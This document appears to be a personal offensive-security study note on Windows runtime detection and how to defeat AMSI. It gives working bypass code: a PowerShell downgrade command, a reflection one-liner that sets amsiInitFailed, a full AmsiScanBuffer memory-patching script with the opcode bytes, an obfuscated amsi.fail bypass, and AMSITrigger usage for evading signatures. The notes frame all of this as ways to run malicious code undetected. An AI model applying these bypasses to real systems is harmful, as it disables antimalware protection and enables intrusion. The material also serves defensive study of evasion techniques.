# What it is?
When executing code or applications, it will almost always flow through a runtime, no matter the interpreter. This is commonly seen when using **Windows API calls** and interacting with **.NET**. The **Common Language Runtime** (CLR) and **Dynamic Language Runtime** (DLR) are the runtimes for .NET and are the most common we will encounter when working with Windows systems.
A runtime detection measure will scan code before execution in the runtime and determine if it is malicious or not. Depending on the detection measure and technology behind it, this detection could be based on [[Signature Evasion|string signatures]], heuristics or behaviors. If code is suspected of being malicious, it will be assigned a value, and if within a specified range, it will stop execution and possibly quarantine or delete the file.
Runtime detection measures are different from a standard [[Antivirus]] because they will scan directly from memory and the runtime. At the same time AV products can also employ these runtime detections to give more insight into the calls and hooks originating from code. Some AVs, may use a runtime detection feed as part of their heuristics.

# AMSI
Anti-Malware Scan Interface (AMSI) is a PowerShell security feature that will allow any applications or services to integrate directly into anti-malware products. Defender uses AMSI to scan payloads and scripts before execution inside the .NET runtime. Microsoft sells it as a versatile interface standard that allows our applications and services to integrate with any anti-malware product that's present on a machine.
AMSI will determine its actions from a response code as a result of monitoring and scanning.
- `AMSI_RESULT_CLEAN` = `0`
- `AMSI_RESULT_NOT_DETECTED` = `1`
- `AMSI_RESULT_BLOCKED_BY_ADMIN_START` = `16384`
- `AMSI_RESULT_BLOCKED_BY_ADMIN_END` = `20479`
- `AMSI_RESULT_DETECTED` = `32768`
These response codes will only be reported on the backend of AMSI or through third party implementation. If AMSI detects a malicious result, it will halt execution and send the below error message
```powershell
PS C:Users\user> 'Invoke-Hacks' 
At line:1 char:1 
+ "Invoke-Hacks" 
+ ~~~~~~~~~~~~~~ 
+ This script contains malicious content and has been blocked by your antivirus software. 
	+ CategoryInfo          : ParserError: (:) []. ParentContainsErrorRecordException 
	+ FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
AMSI is fully integrated into the following Windows components,
- [[Bypassing UAC|UAC]]
- PowerShell
- Windows Script Host (wscript and cscript)
- JavaScript and VBScript
- Office VBA macros
As attackers, when targeting the above components, we will need to be mindful of AMSI and its implementations when executing code or abusing components.

## AMSI uses
The way AMSI is used can be complex, including multiple DLLs and varying execution strategies depending on where it is used. By definition, AMSI is only an interface for other anti-malware products; AMSI will use multiple provider DLLs and API calls depending on what is being executed and at what layer it is being executed.
AMSI is used from `System.Management.Automation.dll`, a .NET assembly developed by Windows. The .NET assembly will instrument other DLLs and API calls depending on the interpreter and whether it is on disk or memory. The below diagram depicts how data is dissected as it flows through the layers and what DLLs/API calls are being used.
![[Pasted image 20240908213735.png]]
In the above graph, data will begin flowing dependent on the interpreter used (PS, VBScript, etc.). Various API calls and interfaces will be instrumented as the data flows down the model at each layer. It is important to understand the complete model of AMSI, but we can break it down into core components.
![[Pasted image 20240908214201.png]]
AMSI is only used when loaded from memory when executed from the CLR. It is assumed that if on disk `MsMpEng.exe` (Defender) is already being used.
Most of the known bypasses are placed in the Win32 API layer, manipulating the [AmsiScanBuffer](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) API call.

---

We can break down the code for AMSI PowerShell uses to better understand how it is implemented and checks for suspicious content. To find where AMSI is used, we can use [InsecurePowerShell](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master). It is a github fork of PowerShell with security features removed, meaning we can look through the compared commits and observe any security features. AMSI is only used in twelve lines of code under `src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs`. These are
```cs
var scriptExtent = scriptBlockAst.Extent;
 if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
 {
  var parseError = new ParseError(scriptExtent, "ScriptContainedMaliciousContent", ParserStrings.ScriptContainedMaliciousContent);
  throw new ParseException(new[] { parseError });
 }

 if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null)
 {
  HasSuspiciousContent = true;
 }
```

# PowerShell Downgrade
PowerShell downgrade attack is a very simple attack that allows us to modify the current PowerShell version to remove security features.
Most PowerShell sessions will start with the most recent PowerShell engine, but we can manually change the version with a one-liner. By "downgrading" the Powershell version to 2.0 we can bypass security features since they were not implemented until version 5.0.
The attack only require a one-liner to execute in our session. We can launch a new PowerShell process with the flag `-Version` 
```
PowerShell -Version 2
```
This attack can be encountered in tools such as [Unicorn](https://github.com/trustedsec/unicorn)

Since this attack is so fucking simple, there are many ways to both detect and mitigate the attack. The two easiest are removing/disabling PowerShell 2.0 from the device or denying access to PowerShell 2.0 via application blacklisting.

# PowerShell Reflection
Reflection allows a user or administrator to access and interact with .NET assemblies. These may seem foreign, but we can make them more familiar by knowing they take shape in familiar formats such as exe and dll.
Powershell reflection can be abused to modify and identify information from valuable DLLs.
The AMSI utilities for Powershell are stored in the `AMSIUtils` .NET assembly located in `System.Management.Automation.AmsiUtils`.
One one-liner to use reflection to modify and bypass the AMSI utility is the following
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
First it will call the reflection function and specify it wants to use an assembly (`[Ref.Assembly]`). It will then obtain the type of the AMSI utility using `GetType`. Finally we will obtain the `amsiInitFailed` field within the assembly using `GetField`, this field controls weather AMSI has initialized or has failed. And finally set the value from `$false` to `$true`, indicating that it has "failed" to initialize, effectively disabling AMSI

# Patching AMSI
AMSI is primarily instrumented and loaded from `amsi.dll`, this can be confirmed from the prior diagram. This dll can be abused and forced to point to a response code we want. The `AmsiScanBuffer` function provides us the hooks and functionality we need to access the pointer/buffer for the response code.
`AmsiScanBuffer` is vulnerable because `amsi.dll` is loaded into the PowerShell process at startup, our session has the same permission level as the utility. 
`AmsiScanBuffer` will scan a "buffer" of suspected code and report to `amsi.dll` to determine the response. We can control this function and overwrite the buffer with a clean return code. To identify the buffer needed for the return code, we need to do some reverse engineering, luckily someone else has done that.
We will break down a code snippet modified by BC-Security and inspired by Tal Liberman; we can find the original code [here](https://github.com/BC-SECURITY/Empire/blob/python2_agent_v2/empire/server/common/bypasses.py). RastaMouse also has a similar bypass written in C# that uses the same technique; we can find the code [here](https://github.com/rasta-mouse/AmsiScanBufferBypass).

---

At a high level AMSI patching can be broken up into four steps
1. Obtain handle of `amsi.dll`
2. Get process address of `AmsiScanBuffer`
3. Modify memory protections of `AmsiScanBuffer`
4. Write opcodes to `AmsiScanBuffer`
We first need to load in any external libraries or API calls we want to utilize
```cs
[DllImport(`"kernel32`")] // Import DLL where API call is stored
public static extern IntPtr GetProcAddress( // API Call to import
	IntPtr hModule, // Handle to DLL module
	string procName // function or variable to obtain
);

[DllImport(`"kernel32`")]
public static extern IntPtr GetModuleHandle(
	string lpModuleName // Module to obtain handle
);

[DllImport(`"kernel32`")]
public static extern bool VirtualProtect(
	IntPtr lpAddress, // Address of region to modify
	UIntPtr dwSize, // Size of region
	uint flNewProtect, // Memory protection options
	out uint lpflOldProtect // Pointer to store previous protection options
);
```
Keep in mind that we would need to put everything above within the `$MethodDefinition` variable as a string 
```powershell
$MethodDefinition = "

	[DllImport(`"kernel32`")]
	(...)
		out uint lpflOldProtect
	);

";
```
With our functions defined, we now need to load the API calls using `Add-Type`. This cmdlet will load the functions with a proper type and namespace that will allow the functions to be called.
```powershell
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
```
Now that we can call our API functions, we can identify where `amsi.dll` is located and how to get the function. First, we need to identify the process handle of AMSI using `GetModuleHandle`. The handle will then be used to identify the process address of `AmsiScanBuffer` using `GetProcAddress`.
```powershell
$handle = [Win32.Kernel32]::GetModuleHandle(
	'amsi.dll' // Obtains handle to amsi.dll
);
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(
	$handle, // Handle of amsi.dll
	'AmsiScanBuffer' // API call to obtain
); 
```
Next, we need to modify the memory protection of the `AmsiScanBuffer` process region. We can specify parameters and the buffer address for `VirtualProtect`.

```powershell
[UInt32]$Size = 0x5; // Size of region
[UInt32]$ProtectFlag = 0x40; // PAGE_EXECUTE_READWRITE
[UInt32]$OldProtectFlag = 0; // Arbitrary value to store options
[Win32.Kernel32]::VirtualProtect(
	$BufferAddress, // Point to AmsiScanBuffer
	$Size, // Size of region
	$ProtectFlag, // Enables R or RW access to region
	[Ref]$OldProtectFlag // Pointer to store old options
); 
```
Finally we need to specify what we want to overwrite the buffer with, the process to identify this buffer can be found [here](https://rastamouse.me/memory-patching-amsi-bypass/). Once the buffer is specified, we can use [marshal copy](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-6.0) to write to the process.
```powershell
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy(
	$buf, // Opcodes/array to write
	0, // Where to start copying in source array 
	$BufferAddress, // Where to write (AsmiScanBuffer)
	6 // Number of elements/opcodes to write
); 
```
At this point our bypass should be finished, of course this is a known exploit, so trying it as is will get our code flagged.

# Automating
While preferred to use previous methods, we can use automated tools to break AMSI signatures or compile a bypass.

---

The first automation tool we will look at is [amsi.fail](http://amsi.fail/)
`amsi.fail` will compile and generate a Powershell bypass from a collection of known bypasses. It generates obfuscated PS snippets that break or disable AMSI for the current process. These snippets are randomly selected from a small pool of techniques/variation before obfuscating. Every snippet is obfuscated at runtime so that no generated output shares the same signatures. 
Giving us things like
```powershell
$d=$null;$qcgcjblv=[$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).Runtime.InteropServices.Marshal]::AllocHGlobal((9076+7561-7561));$pkgzwpahfwntq="+('lwbj'+'cymh').NORmaliZe([CHar]([byTe]0x46)+[char](111)+[ChAR]([ByTE]0x72)+[chaR](109*73/73)+[ChAR]([ByTE]0x44)) -replace [char]([bytE]0x5c)+[Char](112*106/106)+[char]([bYte]0x7b)+[chAR]([BYtE]0x4d)+[CHAR](110+8-8)+[CHAr]([BytE]0x7d)";[Threading.Thread]::Sleep(1595);[Ref].Assembly.GetType("$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).$(('Mãnâge'+'ment').NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -
(...)
```
We can attach this bypasses at the beginning of our code or run it in the same session before executing malicious code.

---

[[Signature Evasion#Automation|AMSITrigger]] allows us to automatically identify strings that are flagging signatures to modify and break them. This method of bypassing AMSI is more consistent than others because we are making the file itself clean. With a simple syntax, we just need to provide the file to check and it should spit the bad lines
```powershell
AmsiTrigger_x64.exe -i "bypass.ps1" -f 3
```
We can just [[Obfuscation|obfuscate]], change or [[AV Evasion Shellcode#Encoding and Encryption|encode]] them, and we should be golden from AMSI at least.